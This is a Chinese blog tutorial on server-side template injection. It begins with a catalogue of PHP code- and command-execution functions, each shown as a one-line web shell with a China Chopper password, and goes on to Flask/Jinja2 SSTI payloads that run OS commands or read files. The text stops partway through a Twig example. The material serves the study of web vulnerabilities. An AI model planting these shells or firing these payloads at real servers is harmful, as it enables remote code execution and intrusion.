class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">浅析SSTI漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-08-06T08:20:21.286Z" title="发表于 2023-08-06 16:20:21">2023-08-06</time><time itemprop="dateCreated datePublished" datetime="2024-05-02T04:34:03.358Z" title="更新于 2024-05-02 12:34:03">2024-05-02</time></header><h1 id="ssti注入姿势">SSTI注入姿势</h1>
<h2 id="一-常见代码执行函数">一、常见代码执行函数</h2>
<p><strong>代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()</strong></p>
<h3 id="1-eval">1- eval()</h3>
<pre><code class="hljs php">传入的参数必须为PHP代码，即需要以分号结尾。
    命令執行：cmd=<span class="hljs-title function_ invoke__">system</span>(whoami);
    菜刀连接密码：cmd
 
<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="特别注意php中是干什么的"><strong>特别注意：php中@是干什么的</strong></h3>
<p><strong>屏蔽掉出错信息,有@时就算连接出错,也不会报错的</strong></p>
<p><strong>原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为</strong></p>
<h3 id="2-assert-最好不要加上分号作为结尾">2- assert()  --（最好不要加上分号作为结尾）</h3>
<pre><code class="hljs php">assert函数是直接将传入的参数当成PHP代码，不需要以分号结尾（特别注意），有时加上分号不会显示结果。
    命令執行：cmd=<span class="hljs-title function_ invoke__">system</span>(whoami)
    菜刀连接密码：cmd
 
<span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>])<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="3-call_user_func">3- call_user_func()</h3>
<pre><code class="hljs plaintext">传入的参数作为assert函数的参数
    命令执行：cmd=system(whoami)
    菜刀连接密码：cmd

&lt;?php call_user_func("assert",$_POST['cmd']); ?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318095943109.png" alt="image-20230318095943109"></p>
<pre><code class="hljs plaintext">&lt;?php
call_user_func($_POST["fun"],$_POST["para"])
?&gt;
//post:fun=assert&amp;para=phpinfo();</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100021647.png" alt="image-20230318100021647"></p>
<h3 id="4-create_function">4- create_function()</h3>
<pre><code class="hljs plaintext">创建匿名函数执行代码
执行命令和上传文件参考eval函数(必须加分号)。
&lt;?php $func =create_function('',$_POST['cmd']);$func(); ?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100307290.png" alt="image-20230318100307290"></p>
<pre><code class="hljs plaintext">&lt;?php
$a= $_POST['func'];
$b = create_function('$a',"echo $a");
$b('');
?&gt;
//post:func=phpinfo();</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100341291.png" alt="image-20230318100341291"></p>
<h3 id="5-array_map">5- array_map()</h3>
<pre><code class="hljs plaintext">array_map() 函数
将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。
回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
    命令执行http://localhost/123.php?func=system   cmd=whoami
    菜刀连接http://localhost/123.php?func=assert   密码：cmd
&lt;?php
    $func=$_GET['func'];
    $cmd=$_POST['cmd'];
    $array[0]=$cmd;
    $new_array=array_map($func,$array);
    echo $new_array;
?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100418007.png" alt="image-20230318100418007"></p>
<h3 id="6-call_user_func_array">6- call_user_func_array()</h3>
<pre><code class="hljs plaintext">将传入的参数作为数组的第一个值传递给assert函数
    cmd=system(whoami)
    菜刀连接密码：cmd
&lt;?php
    $cmd=$_POST['cmd'];
    $array[0]=$cmd;
    call_user_func_array("assert",$array);
?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100436381.png" alt="image-20230318100436381"></p>
<h3 id="7-array_filter">7- array_filter()</h3>
<pre><code class="hljs plaintext">用回调函数过滤数组中的元素：array_filter(数组,函数)
    命令执行func=system&amp;cmd=whoami
    菜刀连接http://localhost/123.php?func=assert  密码cmd
&lt;?php
    $cmd=$_POST['cmd'];
    $array1=array($cmd);
    $func =$_GET['func'];
    array_filter($array1,$func);
?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100458866.png" alt="image-20230318100458866"></p>
<h3 id="8-uasort函数">8- uasort()函数</h3>
<pre><code class="hljs plaintext">php环境&gt;=&lt;5.6才能用
uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
    命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);
    菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd
&lt;?php
    usort($_GET,'asse'.'rt');
?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100517748.png" alt="image-20230318100517748"></p>
<h3 id="9-preg_replace">9- preg_replace()</h3>
<pre><code class="hljs plaintext">preg_replace('正则规则','替换字符'，'目标字符')
执行命令和上传文件参考assert函数(不需要加分号)。
将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。
&lt;?php
    preg_replace("/test/e",$_POST["cmd"],"jutst test");
?&gt;
这里可以使用chr()函数转换ASCII编码来执行代码。
 
#phpinfo();
eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318100543239.png" alt="image-20230318100543239"></p>
<h2 id="二-常见命令执行函数">二、常见命令执行函数</h2>
<p>*<em>命令执行函数主要有（7个）：<em>system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``</em></em></p>
<h3 id="1-system">1- system()</h3>
<pre><code class="hljs plaintext">    作用
    将字符串作为OS命令执行，自带输出功能。

&lt;?php system($_POST["cmd"]);?&gt;</code></pre>
<h3 id="2-passthru">2-passthru()</h3>
<pre><code class="hljs plaintext">    作用
    将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。

&lt;?php passthru($_POST["cmd"]);?&gt;</code></pre>
<h3 id="3-exec">3- exec()</h3>
<pre><code class="hljs plaintext">    作用
    将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。

&lt;?php echo exec($_POST["cmd"]);?&gt; 

&lt;?php print exec($_POST["cmd"]);?&gt;    //他的输出结果需要打印，system()不用打印</code></pre>
<h3 id="4-pcntl_exec">4- pcntl_exec()</h3>
<pre><code class="hljs plaintext">linux: &lt;?php pcntl_exec("/bin/bash",array($_POST["cmd"])); ?&gt;

用的不多。暂时略过。</code></pre>
<h3 id="5-shell_exec">5- shell_exec()</h3>
<pre><code class="hljs plaintext">    作用
    将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。

&lt;?php echo shell_exec($_POST["cmd"]); ?&gt;

&lt;?php print shell_exec($_POST["cmd"]); ?&gt;</code></pre>
<h3 id="6-popenproc_open">6- popen()/proc_open()</h3>
<pre><code class="hljs plaintext">    作用
    该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。

linux: &lt;?php $handle = popen("/bin/ls","r");?&gt;

windows:
&lt;?php
	$cmd = $_POST['cmd']."&gt;&gt; 1.txt";
	//此时的$cmd=ipconfig &gt;&gt; 1.txt
	popen("$cmd",'r'); //实际上就是 popen("ipconfig &gt;&gt; 1.txt", "r"),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。
 
?&gt;</code></pre>
<h3 id="7-反引号">7- 反引号 ``</h3>
<pre><code class="hljs plaintext">    作用
    [``]反引号里面的代码也会被当作OS命令来执行

&lt;?php echo `whoami`?&gt;

或者：

&lt;?php $cmd = $_GET['cmd'];print `$cmd`; ?&gt;</code></pre>
<p><strong>详解查看</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%9A%84&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen是干什么的&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187</a></p>
<h2 id="三-注入流程以及必要函数的用法">三、注入流程以及必要函数的用法</h2>
<pre><code class="hljs plaintext">变量块 {{}}	用于将表达式打印到模板输出
注释块 {##}	注释
控制块	{%%}	可以声明变量，也可以执行语句
行声明	##		可以有和{%%}相同的效果</code></pre>
<pre><code class="hljs plaintext">__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。

__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.

__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里

__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')

__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。

__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。

url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}

current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)

config               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read() }}

g                    {{g}}得到&lt;flask.g of 'flask_ssti'&gt;</code></pre>
<pre><code class="hljs plaintext">int()		将值转换为int类型；

float()		将值转换为float类型；

lower()		将字符串转换为小写；

upper()		将字符串转换为大写；

title()		把值中的每个单词的首字母都转成大写；

capitalize()	把变量值的首字母转成大写，其余字母转小写；

trim()		截取字符串前面和后面的空白字符；

wordcount()	计算一个长字符串中单词的个数；

reverse()	字符串反转；

replace(value,old,new)	替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)	截取length长度的字符串；

striptags()	删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e	转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()		禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；

list()		将变量列成列表；

string()	将变量转换成字符串；

join()		将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()		返回一个数值的绝对值；

first()		返回一个序列的第一个元素；

last()		返回一个序列的最后一个元素；

format(value,arags,*kwargs)	格式化字符串。比如：{{"%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()	返回一个序列或者字典的长度；

sum()		返回列表内数值的和；

sort()		返回排序后的列表；

default(value,default_value,boolean=false)	如果当前变量没有值，则会使用参数中的值来代替。示例：

name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()	返回字符串的长度，别名是count</code></pre>
<h3 id="21-初识ssti">2.1. 初识SSTI</h3>
<h4 id="1-什么是ssti">1. 什么是SSTI？</h4>
<p>SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。</p>
<p>可能SSTI对大家而言不是很熟悉，但是相信大家很熟悉SQL注入。实际上这两者的思路都是相同的，因此可以类比来分析。</p>
<h4 id="2-render_template渲染函数是什么">2. render_template渲染函数是什么</h4>
<p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h4 id="3-注入的思想">3. 注入的思想</h4>
<p>用函数不断调用我们要使用的命令：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
<h4 id="4-什么是模板引擎">4. 什么是模板引擎</h4>
<p>是为了使 <strong>用户界面</strong>和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中</strong>，然后反馈给浏览器，呈现在用户面前</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622150450513.png" alt="image-20230622150450513"></p>
<p>当前的主流框架，一般都采用MVC模式，即：<strong>Model-View-Controller</strong>，用户的输入先进入Controller控制器，然后根据清流类型和请求的指令发送给对应的Model业务模型，由Model层进行业务逻辑的判断、数据库的存取等，最后把结果返回给View视图层，再经模板引擎的渲染展示给用户</p>
<p>模板引擎的基本机理就是<strong>替换（转换）</strong>：<strong>将指定的标签转换为需要的业务数据；将指定的伪语句按照某种流程来变换输出</strong></p>
<p>引用一段代码来简单说一下：</p>
<pre><code class="hljs python">// 模板
var template = <span class="hljs-string">'&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;'</span>;

// 用于匹配的正则
/*
    用于过滤出以&lt;%开头，%&gt;结尾，并且中间不包含%或&gt;的匹配项
    其目的在于过滤出template中的 &lt;%name%&gt; 和 &lt;%age%&gt;
*/
var regex = /&lt;%([^%]+)?%&gt;/g;

// 数据
var data =
{
    name:<span class="hljs-string">'Deutsh'</span>,
    age:<span class="hljs-number">22</span>
}

// 模板引擎
var TemplateEngine = function (template,data)
{
    // <span class="hljs-built_in">exec</span>使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式
    // /regex/.<span class="hljs-built_in">exec</span>()仅返回找到的第一个匹配项
    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">match</span> = regex.<span class="hljs-built_in">exec</span>(template))
    {
        template = template.replace(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>],data[<span class="hljs-keyword">match</span>[<span class="hljs-number">1</span>]])
    }

    <span class="hljs-keyword">return</span> template;
}

// 最终的执行在此处

var string = TemplateEngine(template,data)
console.log(string)</code></pre>
<p>上述代码，我们的目的是：将<strong>数据文件</strong>中对应的name和age替换到<strong>模板文件</strong>中</p>
<p>主要的执行在模板引擎的while函数中，<code>match = regex.exec(template)</code>会返回一个<code>array</code>，这个数组中包含了多个项目</p>
<p>⚠️ 为什么会包含两项呢：当正则表达式设置 <code>g</code> 标志位时，可以多次执行 <code>exec</code> 方法来查找同一个字符串中的成功匹配</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622150533466.png" alt="image-20230622150533466"></p>
<pre><code class="hljs plaintext">之后template = template.replace(match[0],data[match[1]])等同于template = template.replace("&lt;%name%&gt;",data["name"])完成模板中数据的替换</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622150543912.png" alt="image-20230622150543912"></p>
<h4 id="5-引发ssti的真正原因">5. 引发SSTI的真正原因</h4>
<p>render_template渲染函数的问题</p>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
<pre><code class="hljs plaintext">也就是说例如：`{{}}`在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换。比如`{{1+1}}`会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。</code></pre>
<p>还比如说</p>
<p>由前面模板代码安利的演示，我们可以发现，<strong>若服务端接受了用户的输入后（比如对于上述案例，data的name和age的数据由数据的输入/提交/请求而得），未经任何处理就将其作为Web应用模板内容的一部分</strong>，就会导致模板引擎在进行目标编译渲染的过程中，执行了用户插入的可执行语句，从而可能导致信息泄露、代码执行等问题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622150806192.png" alt="image-20230622150806192"></p>
<p>凡是使用模板的地方，SSTI是绕不过的问题，模板引擎可由多种语言实现，所以SSTI也就出现在了多种语言环境中</p>
<p>模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h4 id="6-route装饰器路由">6. route装饰器路由</h4>
<pre><code class="hljs plaintext">@app.route('/')</code></pre>
<p>使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p>
<pre><code class="hljs plaintext">@app.route('/')
def test()"
   return 123</code></pre>
<p>访问127.0.0.1:5000/则会输出123，我们修改一下规则</p>
<p>这个时候访问127.0.0.1:5000/test会输出123.<br>
此外还可以设置动态网址，</p>
<pre><code class="hljs plaintext">@app.route("/hello/&lt;username&gt;")
def hello_user(username):
  return "user:%s"%username</code></pre>
<p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622193641150.png" alt="image-20230622193641150"></p>
<p>或者可以使用int型，转换器有下面几种：</p>
<pre><code class="hljs plaintext">int    接受整数
float    同 int ，但是接受浮点数
path    和默认的相似，但也接受斜线

@app.route('/post/&lt;int:post_id&gt;')
def show_post(post_id):
    # show the post with the given id, the id is an integer
    return 'Post %d' % post_id</code></pre>
<h4 id="7-main入口">7. main入口</h4>
<p>​		当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。</p>
<pre><code class="hljs plaintext">if __name__ == '__main__':
    app.debug = True
    app.run()</code></pre>
<p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
<pre><code class="hljs plaintext">app.debug = True</code></pre>
<p>或者（效果是一样的）<br>
app.run(debug=True)</p>
<p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
<pre><code class="hljs plaintext">app.run(host='0.0.0.0')</code></pre>
<p>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
<h4 id="8-模板渲染重点">8. 模板渲染（重点）</h4>
<p>你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:</p>
<p>简单的模版渲染示例</p>
<pre><code class="hljs plaintext">from flask import render_template

@app.route('/hello/')
@app.route('/hello/&lt;name&gt;')
def hello(name=None):
        return render_template('hello.html', name=name)//我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看</code></pre>
<p>我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。</p>
<p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
<pre><code class="hljs plaintext">├── app.py  
├── static  
│   └── style.css  
└── templates  
    └── index.html</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622194232220.png" alt="image-20230622194232220"></p>
<p>我们写一个index.html文件写templates文件夹中。</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>{{title}} - 小猪佩奇<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, {{user.name}}!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>里面有两个参数需要我们渲染，<a target="_blank" rel="noopener" href="http://user.name">user.name</a>，以及title</p>
<p>我们在app.py文件里进行渲染。</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/index'</span></span>)</span><span class="hljs-comment">#我们访问/或者/index都会跳转</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
   user = {<span class="hljs-string">'name'</span>: <span class="hljs-string">'小猪佩奇'</span>}<span class="hljs-comment">#传入一个字典数组</span>
   <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>,title=<span class="hljs-string">'Home'</span>,user=user)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622194340296.png" alt="image-20230622194340296"></p>
<p>Image这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。</p>
<h3 id="22-判断ssti类型">2.2. 判断SSTI类型</h3>
<p>上面提到网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型？</p>
<p>广为流传的就是这张图了，根据处理返回值的不同来进行判别。（注意括号的数量等）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318105438138.png" alt="image-20230318105438138"></p>
<h4 id="1-常见的模板引擎">1. 常见的模板引擎</h4>
<pre><code class="hljs plaintext">	PHP

Twig模板变量：{{%s}}

Smarty模板变量：{%s}

Blade模板变量：{{%s}}

	Python

Jinja2模板变量：{{%s}}

Tornado模板变量：{{%s}}

Django模板变量：{{ }}

	Java

FreeMarker模板变量：&lt;#%s&gt;``${%s}

Velocity模板变量：#set($x=1+1)${x}</code></pre>
<p><strong>模板引擎众多，各个模板引擎的语法也不尽相同，我们最主要的是能定位出是否存在SSTI漏洞，至于后续的利用，我们掌握一些，其余的见到再查即可</strong></p>
<p><strong>Jinja2</strong></p>
<p>Jinja2 是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。<br>
Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 <code>{{…}}</code> 块。<br>
Jinja2 模板同样支持控制语句，像在 <code>{%…%}</code> 块中。</p>
<pre><code class="hljs plaintext">控制结构 {% %} 可以声明变量，也可以执行语句
变量取值 {{ }} 用于将表达式打印到模板输出
注释块 {# #} 用于注释</code></pre>
<h4 id="2-如何测试是否存在ssti">2. 如何测试是否存在SSTI</h4>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，<strong>通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入</strong>，否则不存在 SSTI</p>
<p>此处我们拿来<strong>bmjoker师傅</strong>提供的一段示例代码</p>
<p>Twig模板引擎示例代码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'\twig\lib\Twig\Autoloader.php'</span>;
　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);

    <span class="hljs-comment">// Twig_Loader_Array 用于定位模板 内置的加载器</span>
    <span class="hljs-comment">// Twig_Environment 来存储配置信息 内置的环境变量</span>
　　<span class="hljs-variable">$twig</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Environment</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Loader_String</span>());

     <span class="hljs-comment">// render() 方法通过其第一个参数载入模板，**并通过第二个参数中的变量来渲染模板**！！重要！！</span>
    <span class="hljs-comment">// 模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET["name"]</span>
　　<span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">"Hello {{name}}"</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">"name"</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"name"</span>]));
